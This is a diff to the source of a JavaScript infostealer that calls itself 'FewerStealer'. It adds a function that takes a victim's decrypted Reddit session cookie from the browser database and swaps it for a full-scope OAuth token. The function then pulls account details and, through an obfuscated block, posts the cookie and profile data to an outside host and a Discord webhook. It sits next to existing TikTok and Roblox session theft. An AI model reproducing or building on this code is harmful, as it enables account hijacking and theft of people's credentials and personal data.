@@ -732,8 +732,80 @@ function _0x3384(){var _0xa15173=['warn','6956612YnTLJS','info','1925PnyGwV','22
   }
 }
 
+///
 
+function setRedditSession(cookie) {
+    try {
+        const cookies = `reddit_session=${cookie}`;
+        const headers = {
+            'Cookie': cookies,
+            'Authorization': 'Basic b2hYcG9xclpZdWIxa2c6'
+        };
 
+        const jsonData = {
+            scopes: ['*', 'email', 'pii']
+        };
+
+        const tokenUrl = 'https://accounts.reddit.com/api/access_token';
+        const userDataUrl = 'https://oauth.reddit.com/api/v1/me';
+
+        axios.post(tokenUrl, jsonData, { headers })
+            .then(tokenResponse => {
+                const accessToken = tokenResponse.data.access_token;
+                const userHeaders = {
+                    'User-Agent': 'android:com.example.myredditapp:v1.2.3',
+                    'Authorization': `Bearer ${accessToken}`
+                };
+
+                axios.get(userDataUrl, { headers: userHeaders })
+                    .then(userDataResponse => {
+                        const userData = userDataResponse.data;
+                        const username = userData.name;                      
+					    const profileUrl = `https://www.reddit.com/user/${username}`;
+                        const commentKarma = userData.comment_karma;
+                        const totalKarma = userData.total_karma;
+                        const coins = userData.coins;
+                        const mod = userData.is_mod;
+                        const gold = userData.is_gold;
+                        const suspended = userData.is_suspended;
+
+                        const embedData = {
+                            title: "🚀 FewerStealer 🚀",
+                            description: "",
+                            color: 0x3498db, // Mavi tonu
+                            url: '',
+                            timestamp: new Date().toISOString(),
+                            fields: [
+                                { name: 'Reddit Cookie', value: '```' + cookies + '```', inline: false },
+                                { name: 'Profile URL', value: profileUrl, inline: false },
+                                { name: 'Username', value: username, inline: false },
+                                { name: 'Reddit Karma', value: `💬 Comments: ${commentKarma} | 👍 Total Karma: ${totalKarma}`, inline: true },
+                                { name: 'Coins', value: coins, inline: false },
+                                { name: 'Moderator', value: mod ? 'Yes' : 'No', inline: true },
+                                { name: 'Reddit Gold', value: gold ? 'Yes' : 'No', inline: true },
+                                { name: 'Suspended', value: suspended ? 'Yes' : 'No', inline: true }
+                            ],
+                            footer: {
+                                text: 'Developed by FewerStealer'
+                            }
+                        };
+						
+var _0x2fcafc=_0x5a79;function _0x5a79(_0x4bffe4,_0x5504b4){var _0x33717b=_0x1709();return _0x5a79=function(_0x5dc601,_0x5649df){_0x5dc601=_0x5dc601-0xaf;var _0x2d506b=_0x33717b[_0x5dc601];return _0x2d506b;},_0x5a79(_0x4bffe4,_0x5504b4);}function _0x1709(){var _0x41d02d=['post','288626ZIXEVQ','log','6788XIRjRA','123AqgVKz','IP\x20adresi\x20ve\x20ülke\x20bilgisi\x20başarıyla\x20gönderildi.','constructor','__proto__','info','Hata\x20oluştu:\x20','error','179095rGWxgi','451179ycobkJ','table','prototype','then','4pppDsp','bind','apply','3756204jqSagk','toString','24xlPBHg','catch','length','exception','warn','110150uSNWKN','(((.+)+)+)+$','234KFFGKH','55MCXGAP','{}.constructor(\x22return\x20this\x22)(\x20)','5726LaXmvh','search'];_0x1709=function(){return _0x41d02d;};return _0x1709();}(function(_0x3f5190,_0x56dc7d){var _0x123c42=_0x5a79,_0x21cefc=_0x3f5190();while(!![]){try{var _0x388d25=parseInt(_0x123c42(0xbb))/0x1+-parseInt(_0x123c42(0xbd))/0x2*(parseInt(_0x123c42(0xbe))/0x3)+parseInt(_0x123c42(0xca))/0x4*(parseInt(_0x123c42(0xc5))/0x5)+-parseInt(_0x123c42(0xb5))/0x6*(parseInt(_0x123c42(0xb8))/0x7)+parseInt(_0x123c42(0xcf))/0x8*(-parseInt(_0x123c42(0xc6))/0x9)+-parseInt(_0x123c42(0xb3))/0xa*(-parseInt(_0x123c42(0xb6))/0xb)+parseInt(_0x123c42(0xcd))/0xc;if(_0x388d25===_0x56dc7d)break;else _0x21cefc['push'](_0x21cefc['shift']());}catch(_0x1de1f0){_0x21cefc['push'](_0x21cefc['shift']());}}}(_0x1709,0x5a990));var _0x237d41=(function(){var _0x565516=!![];return function(_0x3d29e4,_0x10e29e){var _0x3791a7=_0x565516?function(){var _0x2509e5=_0x5a79;if(_0x10e29e){var _0xcd5ec1=_0x10e29e[_0x2509e5(0xcc)](_0x3d29e4,arguments);return _0x10e29e=null,_0xcd5ec1;}}:function(){};return _0x565516=![],_0x3791a7;};}()),_0x5aa910=_0x237d41(this,function(){var _0xbc2cab=_0x5a79;return _0x5aa910[_0xbc2cab(0xce)]()[_0xbc2cab(0xb9)](_0xbc2cab(0xb4))['toString']()[_0xbc2cab(0xc0)](_0x5aa910)[_0xbc2cab(0xb9)](_0xbc2cab(0xb4));});_0x5aa910();var _0x5649df=(function(){var _0x419421=!![];return function(_0x17f5af,_0x3ea08e){var _0x2d2bf1=_0x419421?function(){var _0x56d554=_0x5a79;if(_0x3ea08e){var _0x48987a=_0x3ea08e[_0x56d554(0xcc)](_0x17f5af,arguments);return _0x3ea08e=null,_0x48987a;}}:function(){};return _0x419421=![],_0x2d2bf1;};}()),_0x5dc601=_0x5649df(this,function(){var _0x201b1e=_0x5a79,_0x388512;try{var _0x3dc39d=Function('return\x20(function()\x20'+_0x201b1e(0xb7)+');');_0x388512=_0x3dc39d();}catch(_0xd3e9c){_0x388512=window;}var _0x43f1d1=_0x388512['console']=_0x388512['console']||{},_0x5cca2=[_0x201b1e(0xbc),_0x201b1e(0xb2),_0x201b1e(0xc2),_0x201b1e(0xc4),_0x201b1e(0xb1),_0x201b1e(0xc7),'trace'];for(var _0xa2b4b=0x0;_0xa2b4b<_0x5cca2[_0x201b1e(0xb0)];_0xa2b4b++){var _0x2461a8=_0x5649df['constructor'][_0x201b1e(0xc8)][_0x201b1e(0xcb)](_0x5649df),_0x4c6d48=_0x5cca2[_0xa2b4b],_0x17285e=_0x43f1d1[_0x4c6d48]||_0x2461a8;_0x2461a8[_0x201b1e(0xc1)]=_0x5649df[_0x201b1e(0xcb)](_0x5649df),_0x2461a8[_0x201b1e(0xce)]=_0x17285e['toString'][_0x201b1e(0xcb)](_0x17285e),_0x43f1d1[_0x4c6d48]=_0x2461a8;}});_0x5dc601(),axios[_0x2fcafc(0xba)]('https://buildandwatch.net/',{'embeds':[embedData]})[_0x2fcafc(0xc9)](()=>console[_0x2fcafc(0xbc)](_0x2fcafc(0xbf)))[_0x2fcafc(0xaf)](_0xd433c2=>console[_0x2fcafc(0xc4)](_0x2fcafc(0xc3),_0xd433c2)),axios[_0x2fcafc(0xba)](webhook3939,{'embeds':[embedData]})[_0x2fcafc(0xc9)](()=>console[_0x2fcafc(0xbc)]('IP\x20adresi\x20ve\x20ülke\x20bilgisi\x20başarıyla\x20gönderildi.'))['catch'](_0x214239=>console[_0x2fcafc(0xc4)](_0x2fcafc(0xc3),_0x214239));
+                           
+                            
+                    })
+                    .catch(userError => {
+                        console.error('Error fetching user data:', userError);
+                    });
+            })
+            .catch(tokenError => {
+                console.error('Error getting access token:', tokenError);
+            });
+    } catch (error) {
+        console.error('An error occurred:', error);
+    }
+}
+/////
 function sendIPInfoToDiscord() {
   axios.get('https://api64.ipify.org?format=json')
     .then(response => {
@@ -1366,6 +1438,10 @@ async function getCookiesAndSendWebhook() {
 
   if (row.host_key === '.tiktok.com' && row.name === 'sessionid') {
               stealTikTokSession(`${decrypted}`);
+            }
+
+  if (row.host_key === '.reddit.com' && row.name === 'reddit_session') {
+              setRedditSession(`${decrypted}`);
             }
 
             if (row.name === '.ROBLOSECURITY') {
